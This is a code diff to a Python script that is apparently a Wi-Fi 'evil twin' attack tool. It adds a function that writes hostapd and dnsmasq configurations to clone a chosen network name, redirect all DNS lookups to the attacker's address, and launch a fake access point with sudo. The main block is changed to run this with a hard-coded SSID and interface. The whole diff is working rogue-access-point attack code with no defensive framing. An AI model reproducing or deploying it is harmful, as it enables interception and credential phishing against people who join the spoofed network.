@@ -73,11 +73,30 @@ def apRescanHandler(interface):
         attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
     return devices[int(attSsid) - 1].ssid
 
+def createAP(ssid, interface):
+    # Remove and create dnsmasq.conf
+    os.remove("eviltwinfiles/dnsmasq.conf")
+    f = open("eviltwinfiles/dnsmasq.conf", "a")
+    dnsmasq_conf = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.100,8h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1"
+
+    # Remove and create hostapd.conf
+    os.remove("eviltwinfiles/hostapd.conf")
+    s = open("eviltwinfiles/hostapd.conf", "a")
+    hostapd_conf = "interface=" + interface + "\nssid=" + ssid + "\nchannel=1\ndriver=nl80211"
+
+    f.write(dnsmasq_conf)
+    s.write(hostapd_conf)
+    f.close()
+    s.close()
+
+    os.system("sudo bash ./eviltwinfiles/fake-ap-start.sh ")
+
+
 if __name__ == "__main__":
-    checkFotRoot()
-    apDevice = chooseDevice()
-    ssid = apRescanHandler(apDevice)
-    print(ssid)
-    # print(attDevice)
-    # os.system('trackerjacker -i ' + attDevice + ' --h')
-    # goMonitorMode(attDevice)
+     checkFotRoot()
+     # apDevice = chooseDevice()
+     #ssid = apRescanHandler(apDevice)
+     #print(ssid)
+     #os.system('trackerjacker -i ' + apDevice + ' --map')
+
+     createAP("sergeyyyyy","wlp3s0")
